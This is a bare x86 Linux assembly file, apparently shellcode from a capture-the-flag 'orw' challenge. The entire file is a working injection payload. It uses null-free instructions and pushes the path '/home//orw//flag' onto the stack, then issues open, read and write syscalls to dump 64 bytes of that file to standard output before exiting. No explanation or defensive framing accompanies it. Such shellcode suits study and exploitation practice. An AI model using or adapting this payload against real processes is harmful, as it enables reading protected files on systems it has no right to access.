BITS 32
global _start

_start:
	jmp open
open:
	xor eax,eax
	push eax
	push 0x67616c66
	push 0x2f2f7772
	push 0x6f2f2f65
	push 0x6d6f682f
	mov ebx,esp
	xor ecx,ecx
	xor edx,edx
	mov al,0x05
	int 0x80
read:
	push esp
	pop ecx
	push eax
	pop ebx
	push 0x40
	pop edx
	mov al,0x03
	int 0x80
write:
	push esp
	pop ecx
	push 0x01
	pop ebx
	push 0x40
	pop edx
	mov al,0x04
	int 0x80
_exit:
	xor eax,eax
	inc eax
	int 0x80